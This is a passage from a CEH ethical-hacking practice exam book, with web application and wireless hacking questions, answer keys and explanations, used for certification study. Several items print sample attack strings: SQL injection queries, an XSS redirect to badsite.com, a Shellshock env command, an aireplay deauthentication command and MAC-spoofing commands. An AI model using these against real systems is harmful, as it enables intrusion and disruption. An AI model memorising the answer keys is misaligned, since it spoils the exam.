Additionally, all CGI scripts on the server will run as the same user, so they have
the potential to conflict (accidentally or deliberately) with other scripts (an attacker
could, for example, write a CGI script to destroy all other attached databases).

☐✗ A is incorrect because server-side includes (SSIs) are directives placed in HTML
pages and evaluated on the server while the pages are being served. They let you add
dynamically generated content to an existing HTML page, without having to serve
the entire page via a CGI program or other dynamic technology.

CEH Certified Ethical Hacker Practice Exams

156

06-ch06.indd 156 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☐✗ B and D are incorrect because both are included as distractors. By now you’re
certainly familiar with Secure Sockets Layer (SSL) and its value as an encryption
method. CSI? Well, that’s just good television. Or it used to be, anyway.

18. An attacker performs a SQL injection attack but receives nothing in return. She then
proceeds to send multiple SQL queries, soliciting TRUE or FALSE responses. Which
attack is being carried out?

A. Blind SQL injection

B. SQL denial of service

C. SQL code manipulation

D. SQL replay

☑ A. Blind SQL injection is really kinda neat, even if you’re not a nerd. Sometimes a
security admin does just enough to frustrate efforts, and you don’t receive the error
messages or returned information you originally counted on. So, to pull out the
info you want, you start asking it (the SQL database) a lot of true-or-false questions.
For example, you could ask the database, “True or false—you have a table called
USERS?” If you get a TRUE, then you know the table name and can start asking
questions about it. For example, “Hey, database, got an entry in your USERS table
named admin?” (SELECT * from USERS where name='admin' and 1=1;#';).
Blind SQL injection is a long, laborious effort, but it can be done.

☐✗ B, C, and D are all incorrect because, so far as I know, none of them is a recognized
attack by EC-Council. I’m sure you can find ways to perform a DoS on a SQL database,
and we’re manipulating SQL all over the place in these injection attacks, but these
terms just aren’t recognized on your exam and are here solely as distractors.

19. A tester is attempting a CSPP attack. Which of the following is she most likely to use in
conjunction with the attack?

A. ;

B. :

C. ‘

D. “

E. --

F. ~

☑ A. CSPP (connection string parameter pollution) is another form of injection attack.
In many web applications, communications with back-end databases make use of the
semicolon to separate parameter requests. Much as with URL tampering, in CSPP
you just change the communication string and see what happens: add a semicolon,
type in your request, and watch to see if it was successful.

Chapter 6: Web-Based Hacking: Servers and Applications

157

06-ch06.indd 157 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☐✗ B, C, D, E, and F are incorrect because these characters do not correspond to a CSPP
attack. The single quote is most often tied to a SQL injection attempt. The other
characters may show up in scripts, strings, and whatnot, but don’t let them fool you—
they’re simply distractors here.

20. An attacker is attempting to elevate privileges on a machine by using Java or other functions,
through nonvalidated input, to cause the server to execute a malicious piece of code and
provide command-line access. Which of the following best describes this action?

A. Shell injection

B. File injection

C. SQL injection

D. URL injection

☑ A. When it comes to web application attacks, there are many vectors and avenues to
take. One of the more common is injecting something into an input string to exploit
poor code. EC-Council defines these attacks in many ways. Also known as command
injection, shell injection is defined as an attempt to gain shell access using Java or
other functions. In short, the attacker will pass commands through a form input
(or other avenue) in order to elevate privileges and open a shell for further malicious
actions. It occurs when commands are entered into form fields instead of the
expected entry.

☐✗ B is incorrect because the EC-Council defines a file injection attack as one where the
attacker injects a pointer in the web form input to an exploit hosted on a remote site.
Sure, this may accomplish the same thing, but it’s not the best choice in this case.

☐✗ C is incorrect because SQL injection attacks involve using SQL queries and
commands to elicit a response or action.

☐✗ D is incorrect because URL injection is not an attack type and is included here as a
distractor.

21. An attacker is successful in using a cookie, stolen during an XSS attack, during an invalid
session on the server by forcing a web application to act on the cookie’s contents. How is
this possible?

A. A cookie can be replayed at any time, no matter the circumstances.

B. Encryption was accomplished at the Application layer, using a single key.

C. Authentication was accomplished using XML.

D. Encryption was accomplished at the Network layer.

☑ B. Cookies can be used for many things. If you can grab all user cookies, you can see
what they visited and sometimes even how long they’ve been there. Cookies can also
hold passwords—and because most people use the same password on multiple sites,
this can be a gold mine for the attacker. In this scenario, the cookie is being replayed

CEH Certified Ethical Hacker Practice Exams

158

06-ch06.indd 158 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

by an attacker to gain access. If a single key is used in encryption, a replay attack is
possible, because cookie authentication is carried out at the Application layer. It is
for this reason some organizations require browsers to automatically delete cookies
on termination.

☐✗ A is incorrect because a replay attack of anything—cookie, stolen authentication
stream, and so on—can’t necessarily be carried out at any time. Replay attacks require
planning and proper setup.

☐✗ C is incorrect because XML has nothing to do with this.

☐✗ D is incorrect because encryption is not carried out at the Network layer in this case.

22. HTML forms include several methods for transferring data back and forth. Inside a form,
which of the following encodes the input into the Uniform Resource Identifier (URI)?

A. HEAD

B. PUT

C. GET

D. POST

☑ C. An HTTP GET is a method for returning data from a form that “encodes” the
form data to the end of the URI (a character string that identifies a resource on the
web, such as a page of text, a video clip, an image, or an application). For example, if
you were to enter a credit card number in a form using GET, the resulting URL might
look something like https://somesite.com/creditcard.asp?c#=4013229567852219,
where the long number is obviously a credit card number just sitting there waiting for
anyone to use.

Generally speaking, a POST is “more secure” than a GET, although they both have
their uses. If you’re wondering when a GET should be used as opposed to a POST,
the answer has to do with a vocabulary lesson: defining the term idempotent. Thrown
about with HTTP GET, idempotent is a mathematical concept about an operation
property: if the operation can be performed without changing results, even if it
is run multiple times, it’s considered idempotent. Therefore, if the input return
is assured of having no lasting effect on the state of the form in total, then using
a GET is perfectly reasonable. Also, a GET can usually transfer only up to 8KB,
whereas a POST can usually handle up to 2GB. However, keep in mind it may wind
up including sensitive information in that URI. Suppose your form returns a credit
card number and a bad guy is logging URIs: if HTTP GET is in place, the attacker
may be able to derive the information. In short, users can manipulate both GET
and POST, but GET is simply more visible because of its reliance on something that
browsers render to the screen in an editable field. A POST is meant for pushing data
directly, and a GET is used when the server is expected to pull something from the
data submitted in the URL.

Chapter 6: Web-Based Hacking: Servers and Applications

159

06-ch06.indd 159 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☐✗ A is incorrect because, although HEAD and GET are similar, HEAD is not used in
forms. It’s usually used to pull header information from a web server (for example,
banner grabbing) and to test links.

☐✗ B is incorrect because HTTP PUT is not used in forms. It’s used to transfer files to a
web server.

☐✗ D is incorrect because POST does not include the form data in the URI request.
According to the World Wide Web Consortium (www.w3.org/), HTML
specifications define the difference between GET and POST. GET means that form
data will be encoded by a browser into a URL, whereas POST means the form data
is to appear within the message body. In short, a GET can be used for basic, simple
retrieval of data, and a POST should be used for most everything else (such as sending
an e-mail, updating data on a database, and ordering an item).

23. An attacker is looking at a target website and is viewing an account from the store on URL
http://www.anybiz.com/store.php?id=2. He next enters the following URL:
http://www.anybiz.com/store.php?id=2 and 1=1

The web page loads normally. He then enters the following URL:
http://www.anybiz.com/store.php?id=2 and 1=2

A generic page noting “An error has occurred” appears.

Which of the following is a correct statement concerning these actions?

A. The site is vulnerable to cross-site scripting.

B. The site is vulnerable to blind SQL injection.

C. The site is vulnerable to buffer overflows.

D. The site is not vulnerable to SQL injection.

☑ B. The URLs shown here are attempting to pass a SQL query through to see what
may be going on in the background. Notice the first URL entered added and 1=1.
Because this was a true statement, the page loaded without problem. However,
changing that to a false statement (and 1=2) caused the database to return an error.
This would now be considered “blind” SQL injection because the actual error was not
returned to the attacker (instead, he got a generic page most likely configured by the
database administrator). As an aside, sometimes the attacker won’t receive the error
message or error page at all, but the site will be displayed differently—images out of
place, text messed up, and so on—which also indicates blind SQL may be in order.

☐✗ A and C are incorrect because neither this attack nor the results have anything to do
with cross-site scripting or buffer overflows.

☐✗ D is incorrect because the results indicate SQL injection is possible. Granted, it will
take longer, because the attacker can’t see error messaging, and will require lots of
guesswork and trial and error, but the site is susceptible.

CEH Certified Ethical Hacker Practice Exams

160

06-ch06.indd 160 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

24. Which of the following statements is not true regarding WebGoat?

A. WebGoat is maintained and made available by OWASP.

B. WebGoat can be installed on Windows systems only.

C. WebGoat is based on a black-box testing mentality.

D. WebGoat can use Java or .NET.

☑ B. WebGoat, now in version 8.2.2 (https://www.owasp.org/index.php/
Category:OWASP_WebGoat_Project), is a deliberately insecure web application
maintained by OWASP designed to teach web application security lessons. In each
lesson, users must demonstrate their understanding of a security issue by exploiting a
real vulnerability in the WebGoat application. It’s designed to teach from a black-box
mentality (that is, learners aren’t provided with all information up front and must
discover what they need to know to figure out each lesson, just as they’d have to do in
the real world), can be installed on virtually anything, and makes use of Java and .NET.

☐✗ A, C, and D are incorrect because they are all true statements regarding WebGoat.

25. An attacker is viewing a blog entry showing a news story and asking for comments. In the
comment field, the attacker enters the following:
Nice post and a fun read
<script>onload=window.location='http://www.badsite.com'</script>

What is the attacker attempting to perform?

A. A SQL injection attack against the blog’s underlying database

B. A cross-site scripting attack

C. A buffer overflow DoS attack

D. A file injection DoS attack

☑ B. This is a classic (albeit overly simplified) example of cross-site scripting. In a blog,
the post entry field is intended to take text entry from a visitor and copy it to a
database in the background. What’s being attempted here is to have more than just
the text copied—the <script> indicator is adding a nice little pointer to a malicious
website. If it works, the next visitor to the site who clicks that news story will be
redirected to the bad site location.

☐✗ A, C, and D are all incorrect because this example contains nothing to indicate a
SQL injection or a buffer overflow. Additionally, the idea here is not to perform a
denial of service. Actually, it’s quite the opposite: the attacker wants the site up and
operational so more and more users can be sent to badsite.com.

Chapter 6: Web-Based Hacking: Servers and Applications

161

06-ch06.indd 161 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

26. Which of the following is one of the most common methods for an attacker to exploit
the Shellshock vulnerability?

A. SSH brute force

B. CSRF

C. Form field entry manipulation

D. Through web servers utilizing CGI (Common Gateway Interface)

☑ D. I would bet very large sums of cash you will see Shellshock on your exam—maybe
even a couple of times. Shellshock (also known as Bashdoor) exploits a feature in the
bash shell designed to allow environmental variable setting configuration. Basically,
someone was playing around in bash back in 2014 and figured out they could
add arbitrary commands to environmental variable configuration command-line
submissions. If an attacker input something like
env val='() [ :;}; echo BADCOMMAND' bash -c "echo REALCOMMAND"

on a vulnerable system, BADCOMMAND would be executed before the real command.

Per Symantec (www.symantec.com/connect/blogs/shellshock-all-you-need-know-
about-bash-bug-vulnerability), “The most likely route of attack is through Web
servers utilizing CGI (Common Gateway Interface), the widely used system for
generating dynamic Web content. An attacker can potentially use CGI to send a
malformed environment variable to a vulnerable Web server. Because the server uses
Bash to interpret the variable, it will also run any malicious command tacked on to
it.” Other avenues for Shellshock exploitation include the following:

• OpenSSH The “force command” function (where a fixed command is run
when a user logs on, even if the user requested a different command) can be
exploited in Shellshock.

• DHCP Some DHCP clients have the capability of passing commands to the
bash shell—for example, during connection to a Wi-Fi network. This can be
exploited in Shellshock.

• Qmail If bash is used to process e-mail messaging, the server processes external
input in a way that can be exploited in bash.

☐✗ A is incorrect because brute-forcing an SSH session login has nothing to do with
Shellshock.

☐✗ B is incorrect because cross-site request forgery is a different vulnerability altogether,
dealing with web browser hijacking.

☐✗ C is incorrect because form field manipulation has nothing to do with Shellshock.

CEH Certified Ethical Hacker Practice Exams

162

06-ch06.indd 162 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

27. You are examining website files and find the following text file:
# robots.txt for http://www.anybiz.com/
User-agent: Googlebot
Disallow: /tmp/
User-agent: *
Disallow: /
Disallow: /private.php
Disallow: /listing.html

Which of the following is a true statement concerning this file?

A. All web crawlers are prevented from indexing the listing.html page.

B. All web crawlers are prevented from indexing all pages on the site.

C. The Googlebot crawler is allowed to index pages starting with /tmp/.

D. The Googlebot crawler can access and index everything on the site except for pages
starting with /tmp/.

☑ D. The robots.txt file was created to allow web designers to control index access to
their sites. There are a couple of things you need to know about this file—for your
exam and the real world. The first is, no matter what the robots.txt file says, attackers
using a crawler to index your site are going to ignore it anyway: it’s valid only for
“good-guy” crawlers. After that, the rest is easy: robots.txt is stored on the root, is
available to anyone (by design), and is read in order from top to bottom, much like
an ACL on a router. The format is simple: define the crawler (User-agent :name_
of_crawler), and then define what it does not have access to. Most robot.txt files will
make use of the * variable to signify all crawlers, but you can certainly get specific
with who is allowed in and what they can see.

In this example, from top to bottom, the Googlebot crawler is defined and restricted
from seeing /tmp/ pages—no other restrictions are listed. After that, all other crawlers
(User-agent: *) are restricted from seeing any page (Disallow: /). The last two lines
are truly irrelevant because the condition to ignore all pages has been read.

For additional information here, if you think about what a robots.txt file does, you
could consider it a pointer to pages you, as an attacker, really want to see. After all,
if the security person on the site didn’t want Google indexing it, useful information
probably resides there. On the flip side, a security-minded person may get a little
snippy with robots.txt and have a little fun, sending you to some truly terrible
Internet locations should you try to access one of the pages listed there.

☐✗ A and B are incorrect because the Googlebot crawler is allowed to crawl the site.

☐✗ C is incorrect because Googlebot is instructed to ignore all /tmp/ pages.

Chapter 6: Web-Based Hacking: Servers and Applications

163

06-ch06.indd 163 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6/ Blind Folio: 164

This page intentionally left blank

06-ch06.indd 164 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

CHAPTER

Wireless Network Hacking 7
This chapter includes questions from the following topics:

• Describe wireless network architecture and terminology
• Identify wireless network types and forms of authentication
• Describe wireless encryption algorithms
• Identify wireless hacking methods and tools

Wireless networking icons are usually shown as some sort of beacon with circles (or half circles)
emanating outward, like the waves of an ocean continuing out into the atmosphere to lap onto
shores unseen. And that’s entirely appropriate, since the whole thing started in Hawaii. Well,
at least the wireless data networking we’re discussing, anyway. The real story started way back
in 1888.

While competing for the “Berlin Prize,” proposed as a challenge to prove James Clerk
Maxwell’s electromagnetic theory of light, a German physicist named Heinrich Rudolf Hertz
proved the existence of the radio wave (and managed to create the first man-made ones in the
process). In just six years, his radio wave production exploded onto the scene as a new form of
communication, the telegraph, and wires started popping up everywhere for its point-to-point
use. Shortly thereafter, an Italian inventor named Guglielmo Marconi started playing with the
radio wave itself and discovered he could expand the signal, free it from the telegraph wire, and
use it to send sound. The “Father of Radio” quickly took his demonstration from a short two-mile
radius to communicating across the English Channel and, eventually, the Atlantic Ocean itself.

While World War II saw the United States using radio waves for data transmission—a first
of its kind at that time—the wireless data networks of the modern age sprung out of speculation
after the war that radio waves could be used for something bigger. In 1971, Norman Abramson
and a group of researchers at the University of Hawaii started looking for an answer to a big
question in radio transmission: Could you use a radio transmission to communicate data between
multiple nodes while providing an orderly means for the nodes to take turns when sending data?
Data seemed easy enough, relatively speaking, but if several nodes have data to send at the same
time, how would they take turns and avoid a bunch of garbled mess on the receiving end?

Thus was born “ALOHAnet,” the very first packet-switched, random-access network in
history—with or without wires, I might add. ALOHAnet originally consisted of seven computers
and became the first WLAN (wireless LAN) the world had ever seen. Humble and small in origin,
after connecting to ARPANET in 1972, ALOHAnet heralded a new horizon in networking and
has definitively changed the world.

165

07-ch07.indd 165 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

So the next time somebody visits your home and thanks you for letting them use your Wi-Fi,
hand them a lei and tell them, ‘A’ole pilikia. After all, if you’re going to be nice enough to share,
you may as well say “You’re welcome” in the language of wireless.

STUDY TIPS Once again, the good news here is there hasn’t been a whole lot
of change from the previous version of CEH to now, and most questions
regarding wireless technology will be pretty straightforward. The bad news is,
of those questions that step further into the land of inane minutia,

there are many that will simply drive you mad.
You will definitely see questions focused on encryption protocols, SSIDs, and architecture

that seem pretty straightforward, followed immediately by weird questions on encoding
methods, channel interference, and things of that nature. Be sure you know tools used
in hacking wireless backward and forward—in particular, know Aircrack, as you will no
doubt see screenshots of it and be asked to explain its use.

CEH Certified Ethical Hacker Practice Exams

166

07-ch07.indd 166 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

QUESTIONS

1. Which of the following is a true statement? Q
A. Kismet can be installed on Windows but not on Linux.

B. NetStumbler can be installed on Linux but not on Windows.

C. Kismet cannot monitor traffic on 802.11n networks.

D. NetStumbler cannot monitor traffic on 802.11n networks.

2. Which of the following use a 48-bit initialization vector? (Choose all that apply.)

A. WEP

B. WPA

C. WPA2

D. WEP2

3. Which of the following are true statements? (Choose all that apply.)

A. WEP uses shared-key encryption with TKIP.

B. WEP uses shared-key encryption with RC4.

C. WPA2 uses shared-key encryption with RC4.

D. WPA uses TKIP and AES encryption.

4. Which of the following would you recommend as a means to deny network access by
unauthorized wireless devices to network assets?

A. Wireless access control list

B. Wireless jammer

C. Wireless analyzer

D. Wireless access point

5. While on vacation, Joe receives a phone call from his identity alert service notifying him
that two of his accounts have been accessed in the past hour. Earlier in the day, he did
connect a laptop to a wireless hotspot at McDonald’s and accessed the two accounts in
question. Which of the following is the most likely attack used against Joe?

A. Unauthorized association

B. Honeyspot access point

C. Rogue access point

D. Jamming signal

Chapter 7: Wireless Network Hacking

167

07-ch07.indd 167 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

6. An attacker is attempting to crack a WEP code to gain access to the network. After
enabling monitor mode on wlan0 and creating a monitoring interface (mon 0), she types
this command:
aireplay –ng -0 0 –a 0A:00:2B:40:70:80 –c mon0

What is she trying to accomplish?

A. To gain access to the WEP access code by examining the response to deauthentication
packets, which contain the WEP code

B. To use deauthentication packets to generate lots of network traffic

C. To determine the BSSID of the access point

D. To discover the cloaked SSID of the network

7. Which wireless standard works at 54Mbps on a frequency range of 2.4GHz?

A. 802.11a

B. 802.11b

C. 802.11g

D. 802.11n

8. The team has discovered an access point configured with WEP encryption. What is
needed to perform a fake authentication to the AP in an effort to crack WEP? (Choose all
that apply.)

A. A captured authentication packet

B. The IP address of the AP

C. The MAC address of the AP

D. The SSID

9. Which of the tools listed here is a passive discovery tool?

A. Aircrack

B. Kismet

C. NetStumbler

D. Netsniff

10. You have discovered an access point using WEP for encryption purposes. Which of the
following is the best choice for uncovering the network key?

A. NetStumbler

B. Aircrack

C. John the Ripper

D. Kismet

CEH Certified Ethical Hacker Practice Exams

168

07-ch07.indd 168 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

11. Which of the following statements are true regarding TKIP? (Choose all that apply.)

A. Temporal Key Integrity Protocol forces a key change every 10,000 packets.

B. Temporal Key Integrity Protocol ensures keys do not change during a session.

C. Temporal Key Integrity Protocol is an integral part of WEP.

D. Temporal Key Integrity Protocol is an integral part of WPA.

12. Regarding SSIDs, which of the following are true statements? (Choose all that apply.)

A. SSIDs are always 32 characters in length.

B. SSIDs can be up to 32 characters in length.

C. Turning off broadcasting prevents discovery of the SSID.

D. SSIDs are part of every packet header from the AP.

E. SSIDs provide important security for the network.

F. Multiple SSIDs are needed to move between APs within an ESS.

13. You are discussing WEP cracking with a junior pen test team member. Which of the
following are true statements regarding the initialization vectors? (Choose all that apply.)

A. IVs are 32 bits in length.

B. IVs are 24 bits in length.

C. IVs get reused frequently.

D. IVs are sent in clear text.

E. IVs are encrypted during transmission.

F. IVs are used once per encryption session.

14. A pen test member has configured a wireless access point with the same SSID as the target
organization’s SSID and has set it up inside a closet in the building. After some time,
clients begin connecting to his access point. Which of the following statements are true
regarding this attack? (Choose all that apply.)

A. The rogue access point may be discovered by security personnel using NetStumbler.

B. The rogue access point may be discovered by security personnel using NetSurveyor.

C. The rogue access point may be discovered by security personnel using Kismet.

D. The rogue access point may be discovered by security personnel using Aircrack.

E. The rogue access point may be discovered by security personnel using ToneLoc.

15. A pen test member is running the Airsnarf tool from a Linux laptop. What is she attempting?

A. MAC flooding against an AP on the network

B. Denial-of-service attacks against APs on the network

C. Cracking network encryption codes from the WEP AP

D. Stealing usernames and passwords from an AP

Chapter 7: Wireless Network Hacking

169

07-ch07.indd 169 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

16. What is the integrity check mechanism for WPA2?

A. CBC-MAC

B. CCMP

C. RC4

D. TKIP

17. Which of the following is a true statement regarding wireless security?

A. WPA2 is a better encryption choice than WEP.

B. WEP is a better encryption choice than WPA2.

C. By cloaking the SSID and implementing MAC filtering, you can eliminate the need
for encryption.

D. Increasing the length of the SSID to its maximum increases security for the system.

18. A pen test colleague is attempting to use a wireless connection inside the target’s building.
On his Linux laptop he types the following commands:
ifconfig wlan0 down
ifconfig wlan0 hw ether 0A:0B:0C:1A:1B:1C
ifconfig wlan0 up

What is the most likely reason for this action?

A. Port security is enabled on the access point.

B. The SSID is cloaked from the access point.

C. MAC filtering is enabled on the access point.

D. Weak signaling is frustrating connectivity to the access point.

19. An attacker has successfully configured and set up a rogue wireless AP inside his target. As
individuals connect to various areas, he performs a MITM attack and injects a malicious
applet in some of the HTTP connections. This reroutes user requests for certain pages to
pages controlled by the attacker. Which of the following tools is most likely used by the
attacker to inject the HTML code?

A. Aircrack-ng

B. Kismet

C. Ettercap

D. Honeypot

20. Which of the following is the best choice in searching for and locating rogue access points?

A. WIPS

B. Dipole antenna

C. WACL

D. HIDS

CEH Certified Ethical Hacker Practice Exams

170

07-ch07.indd 170 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

21. Charity visits a client business she has worked with multiple times. When she opens her
laptop, her wireless connection attempts to automatically connect to the network, named
BUSINESS1. Unbeknownst to her, an attacker has set up a cloned network with the
same details. As her connection begins, he sends and continues to resend the third step of
connection handshake. After many iterations of this, the attacker gains enough decrypted
details to crack the encryption key. Which of the following best describes this attack?

A. Rogue AP

B. AP MAC spoofing

C. aLTEr

D. KRACK

Chapter 7: Wireless Network Hacking

171

07-ch07.indd 171 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

QUICK ANSWER KEY

1. D 8. C, D 15. D

2. B, C 9. B 16. A

3. B, D 10. B 17. A

4. A 11. A, D 18. C

5. B 12. B, D 19. C

6. B 13. B, C, D 20. A

7. C 14. A, B, C 21. D

CEH Certified Ethical Hacker Practice Exams

172

07-ch07.indd 172 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

ANSWERS

1. Which of the following is a true statement? A
A. Kismet can be installed on Windows but not on Linux.

B. NetStumbler can be installed on Linux but not on Windows.

C. Kismet cannot monitor traffic on 802.11n networks.

D. NetStumbler cannot monitor traffic on 802.11n networks.

☑ D. Not only is this question overly confusing and very tool specific, it’s pretty much
exactly the type of question you’ll see on your exam. Kismet and NetStumbler are
both wireless monitoring tools with detection and sniffing capabilities. NetStumbler
is Windows specific, whereas Kismet can be installed on virtually anything. Both do
a great job of monitoring 802.11a, b, and g networks, but NetStumbler can’t handle
802.11n. Kismet can even be used as an IDS for your wireless network!

One last fun fact to know in relation to this question—Kismet does a better job
of pulling management packets. A lot of wireless cards on Windows systems don’t
support monitor mode and have a difficult time pulling management and control
packets.

☐✗ A, B, and C are incorrect because they are false statements. Kismet can be installed
on anything, NetStumbler is Windows specific and not available on Linux, and
Kismet can monitor 802.11n networks.

2. Which of the following use a 48-bit initialization vector? (Choose all that apply.)

A. WEP

B. WPA

C. WPA2

D. WEP2

☑ B, C. One of the improvements from WEP to WPA involved extending the
initialization vector (IV) to 48 bits from 24 bits. While this may seem like a simple
doubling of options, you’ve got to remember each additional bit exponentially
increases the keyspace. An IV provides for confidentiality and integrity. Wireless
encryption algorithms use it to calculate an integrity check value (ICV), appending it
to the end of the data payload. The IV is then combined with a key to be input into
an algorithm (RC4 for WEP, AES for WPA2). Therefore, because the length of an IV
determines the total number of potential random values that can possibly be created
for encryption purposes, doubling to 48 bits increased overall security. By itself, this
didn’t answer all security problems—it only meant it took a little longer to capture
enough IV packets to crack the code. However, combined with other steps, it did
provide for better security.

Chapter 7: Wireless Network Hacking

173

07-ch07.indd 173 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☐✗ A is incorrect because WEP uses a 24-bit IV. In WEP, this meant there were
approximately 16 million unique IV values. Although this may seem like a large
number, it’s really not—a determined hacker can capture enough IVs in a brute-force
attack in a matter of hours to crack the key.

☐✗ D is incorrect because there is no such thing as WEP2.

3. Which of the following are true statements? (Choose all that apply.)

A. WEP uses shared-key encryption with TKIP.

B. WEP uses shared-key encryption with RC4.

C. WPA2 uses shared-key encryption with RC4.

D. WPA uses TKIP and AES encryption.

☑ B, D. WEP uses a 24-bit initialization vector and RC4 to “encrypt” data
transmissions, although saying that makes me shake in disgust because it’s really a
misnomer. WEP was designed as basic encryption merely to simulate the “security”
of being on a wired network—hence, the “Equivalent” part in Wired Equivalent
Privacy. It was never intended as true encryption protection. WPA was an
improvement on two fronts. First, the shared key portion of encryption was greatly
enhanced by the use of Temporal Key Integrity Protocol (TKIP). In short, the key
used to encrypt data was made temporary in nature and is swapped out every 10,000
packets or so. Additionally, WPA2 uses NIST-approved encryption with AES as the
algorithm of choice.

☐✗ A is incorrect because WEP does not use TKIP. In addition to the same key being
used to encrypt and decrypt (shared key), it’s not changed and remains throughout the
communication process—which is part of the reason why WEP is so easy to crack.

☐✗ C is incorrect because WPA2 does not use RC4 as an encryption algorithm.

4. Which of the following would you recommend as a means to deny network access by
unauthorized wireless devices to network assets?

A. Wireless access control list

B. Wireless jammer

C. Wireless analyzer

D. Wireless access point

☑ A. Of the choices provided, the access control list is the only one that makes sense.
This is what exactly what an access control list is designed for: by making sure only
devices that are authorized can connect, you ensure unauthorized devices cannot
connect (or at least take steps to avoid their connection). As a side note here, be
careful not to confuse a wireless intrusion prevention system (WIPS) with the ACL.
A WIPS will monitor your traffic and, just like the better-known network intrusion
prevention system, will take steps to prevent intrusion based on traffic analysis,
thresholds, and alerts. Lastly, on questions like this, the process of elimination can
help you discern the answer pretty easily.

CEH Certified Ethical Hacker Practice Exams

174

07-ch07.indd 174 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☐✗ B is incorrect for what should be obvious reasons. Yes, you would prevent
unauthorized connections, but you’d also prevent all connections—even those from
authorized devices. If that’s the case, why have wireless turned on at all? Now, I can
hear some of you screaming that jamming could be used in restricted geographical
spaces to control access, but trust me, ECC sees jammers as an attack tool knocking
everything off. You’re better off seeing it the same way for your exam.

☐✗ C is incorrect because an analyzer doesn’t affect access one way or another.

☐✗ D is incorrect because that’s not the intent of a WAP. Sure you can configure certain
things on the device (like, dare I say, an ACL), but the device itself is designed as the
access point.

5. While on vacation, Joe receives a phone call from his identity alert service notifying him
that two of his accounts have been accessed in the past hour. Earlier in the day, he did
connect a laptop to a wireless hotspot at McDonald’s and accessed the two accounts in
question. Which of the following is the most likely attack used against Joe?

A. Unauthorized association

B. Honeyspot access point

C. Rogue access point

D. Jamming signal

☑ B. Sometimes EC-Council creates and uses redundant terminology, so don’t blame
me for this insanely annoying jewel. In this case, Joe most likely connected to what
he thought was the legitimate McDonald’s free Wi-Fi while he was getting his morning
coffee and checked the accounts in question. However, an attacker in (or close to) the
restaurant had set up another wireless network using the same SSID as the restaurant’s.
This practice is known as the honeyspot attack.

☐✗ A is incorrect because the unauthorized association attack exploits so-called soft access
points—embedded wireless LAN radios in some mobile devices that can be launched
inadvertently and used by the attacker for access to the enterprise network.

☐✗ C is incorrect, but just barely so. The whole idea of a honeyspot attack is predicated
on the idea that the attacker has some kind of rogue access point set up to trick
people into connecting. However, this is a case of one answer being more correct than
the other. Honeyspot attacks are explicitly called out as a separate type of rogue attack
by EC-Council, so you’ll need to remember it that way.

☐✗ D is incorrect because a jamming attack seeks to DoS the entire signal, not necessarily
to steal anything from it.

6. An attacker is attempting to crack a WEP code to gain access to the network. After
enabling monitor mode on wlan0 and creating a monitoring interface (mon 0), she
types this command:
aireplay –ng -0 0 –a 0A:00:2B:40:70:80 –c mon0

Chapter 7: Wireless Network Hacking

175

07-ch07.indd 175 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

What is she trying to accomplish?

A. To gain access to the WEP access code by examining the response to deauthentication
packets, which contain the WEP code

B. To use deauthentication packets to generate lots of network traffic

C. To determine the BSSID of the access point

D. To discover the cloaked SSID of the network

☑ B. Within 802.11 standards, there are several different management-type frames in
use: everything from a beacon and association request to a probe request. One of
these management frames is a deauthentication packet, which basically shuts off a
client from the network. The client then has to reconnect—and will do so quickly.
The idea behind this kind of activity is to generate lots of traffic to capture in order
to discern the WEP access code (from clients trying to reassociate to all the new ARP
packets that will come flying around, since many machines will dump their ARP
cache after being shut off the network). Remember that the initialization vectors
within WEP are relatively short (24 bits) and are reused frequently, so any attempt to
crack the code requires, in general, around 15,000 or so packets. You can certainly
gather these over time, but generating traffic can accomplish it much faster. One
final note on this must be brought up: this type of attack can just as easily result in a
denial-of-service attack against hosts and the AP in question, so be careful.

☐✗ A is incorrect because the response to a deauth packet does not contain the WEP
access code in the clear. If it did, the attacker wouldn’t need to bother with all this
traffic generation in the first place—one simple packet would be enough to crack all
security.

☐✗ C is incorrect because the basic service set identifier (BSSID) is the MAC address
of the AP. It’s usually easy enough to gain from any number of methods (using
airodump, for instance) and isn’t a reason for sending multiple deauth packets. There
